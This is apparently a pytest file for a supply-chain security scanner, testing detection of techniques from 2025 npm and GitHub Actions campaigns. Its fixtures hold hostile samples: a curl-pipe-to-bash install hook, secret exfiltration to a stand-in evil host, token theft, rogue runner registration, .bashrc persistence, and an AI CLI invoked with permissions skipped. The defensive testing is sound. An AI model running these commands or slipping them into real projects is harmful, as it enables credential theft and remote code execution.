"""Detection tests for 2025 supply-chain campaigns: Shai-Hulud, nx/s1ngularity, GhostAction, tj-actions."""

from __future__ import annotations

import json
import sys
from pathlib import Path

ROOT = Path(__file__).resolve().parents[1]
VENDOR_STATIC = ROOT / "vendor" / "chaintrap-static-scan" / "src"
SCRIPTS = ROOT / "scripts"
for p in (SCRIPTS, VENDOR_STATIC):
    if str(p) not in sys.path:
        sys.path.insert(0, str(p))

from chaintrap_static_scan.pattern_scanner import scan_tree  # noqa: E402
from chaintrap_workflow_audit import audit_workflows  # noqa: E402


# ---------- Content scan: npm package TTPs ----------

def test_shai_hulud_preinstall_dropper_in_package_json(tmp_path):
    """Shai-Hulud injects `preinstall: node setup_bun.js` into package.json."""
    pkg = tmp_path / "pkg"
    pkg.mkdir()
    (pkg / "package.json").write_text(
        json.dumps(
            {
                "name": "victim-lib",
                "version": "1.2.3",
                "scripts": {"preinstall": "node setup_bun.js"},
            }
        ),
        encoding="utf-8",
    )
    rules = {h.rule_id for h in scan_tree(pkg, "npm")}
    assert "CTC-TTP002" in rules  # bun dropper reference in install hook


def test_shai_hulud_dropper_filename_flagged(tmp_path):
    pkg = tmp_path / "pkg"
    pkg.mkdir()
    (pkg / "bun_environment.js").write_text("// massive obfuscated blob", encoding="utf-8")
    hits = scan_tree(pkg, "npm")
    rules = {h.rule_id for h in hits}
    assert "CTC-TTP002" in rules


def test_curl_pipe_shell_in_install_hook(tmp_path):
    pkg = tmp_path / "pkg"
    pkg.mkdir()
    (pkg / "package.json").write_text(
        json.dumps(
            {
                "name": "x",
                "version": "1.0.0",
                "scripts": {"postinstall": "curl -s https://evil.tld/x.sh | bash"},
            }
        ),
        encoding="utf-8",
    )
    rules = {h.rule_id for h in scan_tree(pkg, "npm")}
    assert "CTC-TTP001" in rules


def test_nx_ai_cli_weaponization(tmp_path):
    pkg = tmp_path / "pkg"
    pkg.mkdir()
    (pkg / "telemetry.js").write_text(
        "const cp=require('child_process');\n"
        "cp.execSync('claude --dangerously-skip-permissions -p \"scan filesystem\"');\n",
        encoding="utf-8",
    )
    rules = {h.rule_id for h in scan_tree(pkg, "npm")}
    assert "CTC-TTP003" in rules or "CTC-TTP004" in rules


def test_credential_and_persistence_ttps(tmp_path):
    pkg = tmp_path / "pkg"
    pkg.mkdir()
    (pkg / "steal.js").write_text(
        "const t = run('gh auth token');\n"
        "run('trufflehog filesystem /');\n"
        "fs.appendFileSync(process.env.HOME + '/.bashrc', 'sudo shutdown -h 0');\n",
        encoding="utf-8",
    )
    rules = {h.rule_id for h in scan_tree(pkg, "npm")}
    assert "CTC-CRED010" in rules
    assert "CTC-CRED011" in rules
    assert "CTC-PERSIST002" in rules


def test_campaign_marker_string(tmp_path):
    pkg = tmp_path / "pkg"
    pkg.mkdir()
    (pkg / "x.js").write_text("const desc = 'Sha1-Hulud: The Second Coming';\n", encoding="utf-8")
    rules = {h.rule_id for h in scan_tree(pkg, "npm")}
    assert "CTC-IOC001" in rules


def test_clean_package_json_no_false_positive(tmp_path):
    pkg = tmp_path / "pkg"
    pkg.mkdir()
    (pkg / "package.json").write_text(
        json.dumps(
            {
                "name": "clean-lib",
                "version": "1.0.0",
                "scripts": {"build": "tsc -p .", "test": "jest"},
            }
        ),
        encoding="utf-8",
    )
    hits = scan_tree(pkg, "npm")
    ttp = {h.rule_id for h in hits if h.rule_id.startswith(("CTC-TTP", "CTC-PERSIST", "CTC-IOC"))}
    assert not ttp


# ---------- Workflow audit: GitHub Actions campaign TTPs ----------

def _write_wf(tmp_path: Path, name: str, body: str) -> Path:
    wf = tmp_path / ".github" / "workflows"
    wf.mkdir(parents=True, exist_ok=True)
    (wf / name).write_text(body, encoding="utf-8")
    return tmp_path


def test_ghostaction_secret_exfil_detected(tmp_path):
    ws = _write_wf(
        tmp_path,
        "github_actions_security.yml",
        "name: Github Actions Security\n"
        "on: [push]\n"
        "permissions:\n  contents: read\n"
        "jobs:\n"
        "  x:\n"
        "    runs-on: ubuntu-latest\n"
        "    steps:\n"
        "      - run: |\n"
        "          curl -X POST https://bold-dhawan.evil.page -d \"t=${{ secrets.NPM_TOKEN }}\"\n",
    )
    rules = {f["rule_id"] for f in audit_workflows(ws)}
    assert "CTW-008" in rules


def test_shai_hulud_discussion_trigger_detected(tmp_path):
    ws = _write_wf(
        tmp_path,
        "discussion.yaml",
        "name: discussion\non:\n  discussion_comment:\n    types: [created]\n"
        "permissions:\n  contents: read\n"
        "jobs:\n  r:\n    runs-on: ubuntu-latest\n    steps:\n      - run: echo hi\n",
    )
    rules = {f["rule_id"] for f in audit_workflows(ws)}
    assert "CTW-007" in rules


def test_self_hosted_runner_registration_detected(tmp_path):
    ws = _write_wf(
        tmp_path,
        "persist.yml",
        "name: persist\non: [push]\n"
        "permissions:\n  contents: read\n"
        "jobs:\n  r:\n    runs-on: ubuntu-latest\n    steps:\n"
        "      - run: ./actions-runner/config.sh --url https://evil --token X\n",
    )
    findings = audit_workflows(ws)
    ctw7 = [f for f in findings if f["rule_id"] == "CTW-007" and f["severity"] == "CRITICAL"]
    assert ctw7


def test_known_compromised_action_detected(tmp_path):
    ws = _write_wf(
        tmp_path,
        "ci.yml",
        "name: ci\non: [push]\n"
        "permissions:\n  contents: read\n"
        "jobs:\n  r:\n    runs-on: ubuntu-latest\n    steps:\n"
        "      - uses: tj-actions/changed-files@v44\n",
    )
    rules = {f["rule_id"] for f in audit_workflows(ws)}
    assert "CTW-009" in rules
